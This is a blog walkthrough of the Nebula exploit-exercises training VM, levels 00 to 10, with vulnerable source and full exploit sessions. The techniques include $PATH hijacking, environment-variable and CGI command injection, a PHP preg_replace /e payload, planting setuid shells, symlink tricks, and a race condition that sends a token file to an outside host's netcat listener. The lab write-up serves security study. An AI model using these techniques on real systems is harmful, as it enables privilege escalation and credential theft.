---
categories:
- exploit
- linux
tags:
- nebula
- solution
comments: false
date: 2016-05-01T04:28:35Z
title: Nebula Exploit Exercises
url: /2016/05/01/nebula-exploit-exercises/
---

# Intro

Ever since I stumbled upon exploit exercises website - I wanted to try the challenges. They have three main exploitable VMs: Nebula, Protostar and Fusion.
The order represents the difficulty of exploitation.

The welcome page reads:

> exploit-exercises.com provides a variety of virtual machines, documentation and challenges 
> that can be used to learn about a variety of computer 
> security issues such as privilege escalation, vulnerability analysis, exploit development, 
> debugging, reverse engineering, and general cyber security issues. 

Here, I wrote down some of the findings while exploring the Nebula VM. 

<!--more-->

## About

Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at

- SUID files
- Permissions
- Race conditions
- Shell meta-variables
- $PATH weaknesses
- Scripting language weaknesses
- Binary compilation failures

At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.

### Level00

Description:

> This level requires you to find a Set User ID program that will run as the “flag00” account. 
> You could also find this by carefully looking in top level directories in / for suspicious looking directories.

{{< codecaption lang="sh" title="Finding SUID flag00 files" >}}
level00@nebula:~$ find / -user flag00 -perm -4000 -exec ls -l {} \; 2>/dev/null
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /bin/.../flag00
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /rofs/bin/.../flag00
level00@nebula:~$
{{< /codecaption>}}


{{< codecaption lang="sh" title="Getting the flag" >}}
level00@nebula:~$ id
uid=1001(level00) gid=1001(level00) groups=1001(level00)
level00@nebula:~$ /bin/.../flag00 
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag 
You have successfully executed getflag on a target account
flag00@nebula:~$ 
{{< /codecaption >}}

### Level01

Description:

> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

{{< codecaption lang="c" title="Source Code" >}}
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
{{< /codecaption >}}

Here the code uses `echo` binary to display a string. We can exploit that by modifying $PATH variable and placing our own version of `echo` in the PATH.
We can use the provided source code to get a shell by modifying the last line to execute `bash`:

{{< codecaption lang="sh" title="Exploiting $PATH weakness" >}}
level01@nebula:/home/flag01$ export PATH=/tmp:$PATH
level01@nebula:/home/flag01$ cat /tmp/setuid.c 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
level01@nebula:/home/flag01$ gcc /tmp/setuid.c -o /tmp/echo
level01@nebula:/home/flag01$ ./flag01 
flag01@nebula:/home/flag01$ getflag 
You have successfully executed getflag on a target account
flag01@nebula:/home/flag01$ 
{{< /codecaption >}}

### Level02

Description:

> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

{{< codecaption lang="c" title="Source Code" >}}
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
{{< /codecaption >}}

Here, we can inject additional commands into $USER environment variable and terminate the buffer with #:
 
{{< codecaption lang="sh" title="Command Injection" >}}
level02@nebula:/home/flag02$ export USER="user && /bin/bash #"
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo user && /bin/bash # is cool")
user
flag02@nebula:/home/flag02$ getflag 
You have successfully executed getflag on a target account
flag02@nebula:/home/flag02$ 
{{< /codecaption >}}

### Level03
Description:

> Check the home directory of flag03 and take note of the files there.
> There is a crontab that is called every couple of minutes.

This level runs crontab every few minutes which executes anything from `writable.d` folder and then removes it. 
We can reuse `/tmp/setuid.c` file from previous levels:
 
{{< codecaption lang="sh" title="Exploiting Crontab" >}}
level03@nebula:/home/flag03/writable.d$ cat exploit.sh
#!/bin/bash

gcc /tmp/setuid.c -o /home/flag03/shell
chmod +s /home/flag03/shell
level03@nebula:/home/flag03/writable.d$ cd ..
level03@nebula:/home/flag03$ ./shell
flag03@nebula:/home/flag03$ getflag 
You have successfully executed getflag on a target account
flag03@nebula:/home/flag03$ 
{{< /codecaption >}}

### Level04
Description:

> This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)

{{< codecaption lang="c" title="Source Code" >}}
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
{{< /codecaption >}}

This code tries to read the `token` file which is read/write protected. We can bypass that by creating a symlink to the token and reading that instead.
The token file contains the password for `flag04` user.
 
{{< codecaption lang="sh" title="Symbolic Link Exploit">}}
level04@nebula:/home/flag04$ ln -s  /home/flag04/token /tmp/bypass
level04@nebula:/home/flag04$ ./flag04 /tmp/bypass
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ su flag04 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
{{< /codecaption >}}

### Level05
Description:

> Check the flag05 home directory. You are looking for weak directory permissions

This level has world readable backup file which contains the private key for `flag05` user. We can use it to ssh in as `flag05`.

{{< codecaption lang="sh" title="Weak Permissions" >}}
level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -al
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ mkdir /tmp/backup
level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/backup/
level05@nebula:/home/flag05/.backup$ cd /tmp/backup/
level05@nebula:/tmp/backup$ tar xvf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/tmp/backup$ cd .ssh
level05@nebula:/tmp/backup/.ssh$ ssh -i id_rsa flag05@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
{{< /codecaption >}}

### Level06
Description:

> The flag06 account credentials came from a legacy unix system.

Upon closer inspection the /etc/passwd file has DES hash for `flag06` user:

{{< codecaption lang="sh" title="Password Hash" >}}
level06@nebula:~$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
level06@nebula:~$ 
{{< /codecaption >}}

The VM itself does not have `john` installed, so I cracked the password in my local Kali box (the password was **hello**) and used it to get the flag:

{{< codecaption lang="sh" title="Flag06" >}}
level06@nebula:~$ su flag06 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
{{< /codecaption >}}

### Level07
Description:

> The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

{{< codecaption lang="perl" title="Source Code" >}}
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
{{< /codecaption >}}

The vulnerable script is served via thttpd:
{{< codecaption lang="sh" title="THTTPD" >}}
flag07    1169  0.0  0.1   2588   892 ?        Ss   Apr29   0:01 /usr/sbin/thttpd -C /home/flag07/thttpd.conf
{{< /codecaption >}}
And it is running on port 7007.

The perl source code has a command injection vulnerability. We can inject arbitrary commands into the `Host` parameter. 
I chose to reuse the setuid shell from previous levels (/tmp/shell).

The url encoded exploit:
`http://192.168.56.101:7007/index.cgi?Host=localhost|cp%20/tmp/shell%20~%20%26%26%20chmod%204755%20~/shell`

Which executes:
`cp /tmp/shell ~ && chmod 4755 ~/shell`

After that we can grab the flag:
{{< codecaption lang="sh" title="Flag07" >}}
level07@nebula:/home/flag07$ ls -l
total 13
-rwxr-xr-x 1 root   root    368 2011-11-20 21:22 index.cgi
-rwsr-xr-x 1 flag07 flag07 7322 2016-04-30 06:41 shell
-rw-r--r-- 1 root   root   3719 2011-11-20 21:22 thttpd.conf
level07@nebula:/home/flag07$ ./shell
flag07@nebula:/home/flag07$ getflag 
You have successfully executed getflag on a target account
flag07@nebula:/home/flag07$ 
{{< /codecaption >}}

### Level08
Description:

> World readable files strike again. Check what that user was up to, and use it to log into flag08 account.

This level has a world readable capture.pcap file in flag08's home folder. After SCPing it out and viewing it in wireshark, 
we can extract the plaintext password:

![wireshark](/images/2016/05/01/wireshark.png)

The password seen in the screenshot is `backdoor...00Rm8.ate`, hoewever, the dots here are actually `0x7F` characters (which is Backspace), 
so the correct password is `backd00Rmate`
With this password we can get the flag:
 
{{< codecaption lang="sh" title="Flag08" >}}
level08@nebula:/home/flag08$ su flag08 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
{{< /codecaption >}}

### Level09
Description:

> There’s a C setuid wrapper for some vulnerable PHP code…

{{< codecaption lang="php" title="Source Code" >}}
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
{{< /codecaption >}}

This code has `preg_replace with /e modifier` vulnerability. 
Googling this vulnerability we find a post that details the exploitation [here][phpexploit] . 

The vulnerability in our case can be exploited by passing commands via second parameter (which is unused in the code itself), or, 
as described in the post, via first parameter's file contents: 

{{< codecaption lang="text" title="File Contents" >}}
[email ${`shell commands`}]
{{< /codecaption >}}

The full exploit (again reusing setuid shell):

{{< codecaption lang="sh" title="Flag09" >}}
level09@nebula:/home/flag09$ cat /tmp/phpshell 
[email ${`cp /tmp/shell /home/flag09/shell && chmod 4755 /home/flag09/shell`}]

level09@nebula:/home/flag09$ ./flag09 /tmp/phpshell 1
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1


level09@nebula:/home/flag09$ ls -al
total 21
drwxr-x--- 1 flag09 level09   60 2016-05-01 01:20 .
drwxr-xr-x 1 root   root     120 2012-08-27 07:18 ..
-rw-r--r-- 1 flag09 flag09   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag09 flag09  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
-rw-r--r-- 1 flag09 flag09   675 2011-05-18 02:54 .profile
-rwsr-xr-x 1 flag09 level09 7322 2016-05-01 01:20 shell
level09@nebula:/home/flag09$ ./shell
flag09@nebula:/home/flag09$ getflag 
You have successfully executed getflag on a target account
flag09@nebula:/home/flag09$ 
{{< /codecaption >}}

### Level10
Description:

> The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.

{{< codecaption lang="c" title="Source Code" >}}
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
{{< /codecaption >}}

This code is vulnerable to "time of check to time of use" race condition. It has its own wiki [article][race]. 
The logic of the (SETUID) code here and the one in the article is basically the same - check if the current user has access to a file and if so - process the file.

To exploit this logic we need to first pass in the file that we have access to (to pass the check) and later switch it out (symlink) to another file (which we WANT to access).
The timing is crucial here and the race needs to be automated. 
I wrote the following script:

{{< codecaption lang="sh" title="Race Condition" >}}
#!/bin/bash

rm -rf /tmp/access
touch /tmp/access
/home/flag10/flag10 /tmp/access 192.168.56.1 &
ln -sf /home/flag10/token /tmp/access
{{< /codecaption >}}

After a few attempts we receive the token to our netcat listener:

{{< codecaption lang="sh" title="Token" >}}
root@kali:~# nc -lkp 18211
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
root@kali:~# 
{{< /codecaption >}}

Back inside the Nebula VM:

{{< codecaption lang="sh" title="Flag10" >}}
level10@nebula:/home/flag10$ su flag10 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
{{< /codecaption >}}

[phpexploit]: http://www.madirish.net/402
[race]: https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use

